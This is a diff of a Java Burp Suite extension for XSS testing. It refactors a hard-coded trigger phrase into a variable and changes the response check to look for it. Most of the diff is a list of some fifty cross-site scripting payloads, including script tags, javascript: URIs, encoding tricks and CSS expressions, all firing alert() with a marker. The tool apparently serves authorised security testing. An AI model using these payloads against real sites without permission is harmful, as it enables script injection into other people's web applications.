@@ -29,6 +29,8 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
     // Default server location for phantomJS Server
     // If you're using a customer server, please change and recompile.
     private static String phantomServer = "http://127.0.0.1:8093";
+    
+    private static String triggerPhrase = "f7sdgfjFpoG";
 	
     /**
      * Initial Payloads containing trigger phrase, f7sdgfjFpoG.
@@ -37,60 +39,60 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
      * function calls contain the trigger phrase, suggesting
      * that it was passed via the Burp payload.
      * 
-     * This is used to reduce the liklihood of false-positives.
+     * This is used to reduce the likelihood of false-positives.
      */
 	public static final byte[][] PAYLOADS = {
-		"<script>alert('f7sdgfjFpoG')</script>".getBytes(),
-		"\"><script>alert('f7sdgfjFpoG')</script>".getBytes(),
-		"'><script>alert('f7sdgfjFpoG')</script>".getBytes(),
-		"<SCRIPT>alert('f7sdgfjFpoG');</SCRIPT>".getBytes(),
-		"'';!--\"<f7sdgfjFpoG>=&{()}".getBytes(),
-		"<IMG SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=javascript:alert('f7sdgfjFpoG')>".getBytes(),
-		"<IMG SRC=JaVaScRiPt:alert('f7sdgfjFpoG')>".getBytes(),
-		"<IMG SRC=javascript:alert(&quot;f7sdgfjFpoG&quot;)>".getBytes(),
-		"<IMG SRC=`javascript:alert(\"RSnake says, 'f7sdgfjFpoG'\")`>".getBytes(),
-		"<IMG SRC=\"jav	ascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=\"jav&#x09;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=\"jav&#x0A;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=\"jav&#x0D;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=\" &#14;  javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC=java%00script:alert(\\\"f7sdgfjFpoG\\\")>".getBytes(),
-		"<SCR%00IPT>alert(\\\"f7sdgfjFpoG\\\")</SCR%00IPT>".getBytes(),
-		"<IMG SRC=\"javascript:alert('f7sdgfjFpoG')\"".getBytes(),
-		"<SCRIPT>a=/f7sdgfjFpoG/".getBytes(),
-		"\\\";alert('f7sdgfjFpoG');//".getBytes(),
-		"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<BODY BACKGROUND=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
-		"<BODY ONLOAD=alert('f7sdgfjFpoG')>".getBytes(),
-		"<IMG DYNSRC=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
-		"<IMG LOWSRC=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
-		"<BGSOUND SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<BR SIZE=\"&{alert('f7sdgfjFpoG')}\">".getBytes(),
-		"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IMG SRC='vbscript:msgbox(\"f7sdgfjFpoG\")'>".getBytes(),
-		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('f7sdgfjFpoG')>; REL=stylesheet\">".getBytes(),
-		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<IFRAME SRC=\"javascript:alert('f7sdgfjFpoG');\"></IFRAME>".getBytes(),
-		"<FRAMESET><FRAME SRC=\"javascript:alert('f7sdgfjFpoG');\"></FRAMESET>".getBytes(),
-		"<TABLE BACKGROUND=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
-		"<DIV STYLE=\"background-image: url(javascript:alert('f7sdgfjFpoG'))\">".getBytes(),
-		"<DIV STYLE=\"background-image: url(&#1;javascript:alert('f7sdgfjFpoG'))\">".getBytes(),
-		"<DIV STYLE=\"width: expression(alert('f7sdgfjFpoG'));\">".getBytes(),
-		"<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"f7sdgfjFpoG\")';</STYLE>".getBytes(),
-		"<IMG STYLE=\"f7sdgfjFpoG:expr/*f7sdgfjFpoG*/ession(alert('f7sdgfjFpoG'))\">".getBytes(),
-		"<f7sdgfjFpoG STYLE=\"f7sdgfjFpoG:expression(alert('f7sdgfjFpoG'))\">".getBytes(),
-		"exp/*<f7sdgfjFpoG STYLE='no\\f7sdgfjFpoG:nof7sdgfjFpoG(\"*//*\");".getBytes(),
-		"<STYLE TYPE=\"text/javascript\">alert('f7sdgfjFpoG');</STYLE>".getBytes(),
-		"<STYLE>.f7sdgfjFpoG{background-image:url(\"javascript:alert('f7sdgfjFpoG')\");}</STYLE><A CLASS=f7sdgfjFpoG></A>".getBytes(),
-		"<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('f7sdgfjFpoG')\")}</STYLE>".getBytes(),
-		"<BASE HREF=\"javascript:alert('f7sdgfjFpoG');//\">".getBytes(),
-		"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('f7sdgfjFpoG')></OBJECT>".getBytes(),
-		"getURL(\"javascript:alert('f7sdgfjFpoG')\")".getBytes(),
-		"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('f7sdgfjFpoG')&lt;/SCRIPT&gt;\">".getBytes(),
-		"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('f7sdgfjFpoG');+ADw-/SCRIPT+AD4-".getBytes(),
+		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
+		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
+		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
+		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
+		("'';!--\"<" + triggerPhrase + ">=&{()}").getBytes(),
+		("<IMG SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=javascript:alert('" + triggerPhrase + "')>").getBytes(),
+		("<IMG SRC=JaVaScRiPt:alert('" + triggerPhrase + "')>").getBytes(),
+		("<IMG SRC=javascript:alert(&quot;" + triggerPhrase + "&quot;)>").getBytes(),
+		("<IMG SRC=`javascript:alert(\"RSnake says, '" + triggerPhrase + "'\")`>").getBytes(),
+		("<IMG SRC=\"jav	ascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=\"jav&#x09;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=\"jav&#x0A;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=\"jav&#x0D;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=\" &#14;  javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC=java%00script:alert(\\\"" + triggerPhrase + "\\\")>").getBytes(),
+		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
+		("<IMG SRC=\"javascript:alert('" + triggerPhrase + "')\"").getBytes(),
+		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
+		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
+		("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<BODY BACKGROUND=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
+		("<BODY ONLOAD=alert('" + triggerPhrase + "')>").getBytes(),
+		("<IMG DYNSRC=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
+		("<IMG LOWSRC=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
+		("<BGSOUND SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<BR SIZE=\"&{alert('" + triggerPhrase + "')}\">").getBytes(),
+		("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IMG SRC='vbscript:msgbox(\"" + triggerPhrase + "\")'>").getBytes(),
+		("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('" + triggerPhrase + "')>; REL=stylesheet\">").getBytes(),
+		("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<IFRAME SRC=\"javascript:alert('" + triggerPhrase + "');\"></IFRAME>").getBytes(),
+		("<FRAMESET><FRAME SRC=\"javascript:alert('" + triggerPhrase + "');\"></FRAMESET>").getBytes(),
+		("<TABLE BACKGROUND=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
+		("<DIV STYLE=\"background-image: url(javascript:alert('" + triggerPhrase + "'))\">").getBytes(),
+		("<DIV STYLE=\"background-image: url(&#1;javascript:alert('" + triggerPhrase + "'))\">").getBytes(),
+		("<DIV STYLE=\"width: expression(alert('" + triggerPhrase + "'));\">").getBytes(),
+		("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"" + triggerPhrase + "\")';</STYLE>").getBytes(),
+		("<IMG STYLE=\"" + triggerPhrase + ":expr/*" + triggerPhrase + "*/ession(alert('" + triggerPhrase + "'))\">").getBytes(),
+		("<" + triggerPhrase + " STYLE=\"" + triggerPhrase + ":expression(alert('" + triggerPhrase + "'))\">").getBytes(),
+		("exp/*<" + triggerPhrase + " STYLE='no\\" + triggerPhrase + ":no" + triggerPhrase + "(\"*//*\");").getBytes(),
+		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
+		("<STYLE>." + triggerPhrase + "{background-image:url(\"javascript:alert('" + triggerPhrase + "')\");}</STYLE><A CLASS=" + triggerPhrase + "></A>").getBytes(),
+		("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('" + triggerPhrase + "')\")}</STYLE>").getBytes(),
+		("<BASE HREF=\"javascript:alert('" + triggerPhrase + "');//\">").getBytes(),
+		("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('" + triggerPhrase + "')></OBJECT>").getBytes(),
+		("getURL(\"javascript:alert('" + triggerPhrase + "')\")").getBytes(),
+		("<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('" + triggerPhrase + "');\">").getBytes(),
+		("<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('" + triggerPhrase + "')&lt;/SCRIPT&gt;\">").getBytes(),
+		("<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('" + triggerPhrase + "');+ADw-/SCRIPT+AD4-").getBytes(),
 	};
 	
 	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
@@ -166,8 +168,9 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
 	            
             	stdout.println("Response: " + responseAsString);
             	
-	            // parse response for XSS
-	            if(responseAsString.contains("found")) {
+	            // parse response for XSS by checking whether it contains 
+            	// the trigger phrase
+	            if(responseAsString.contains(triggerPhrase)) {
 	            	// Append weird string to identify XSS
 		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
 	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
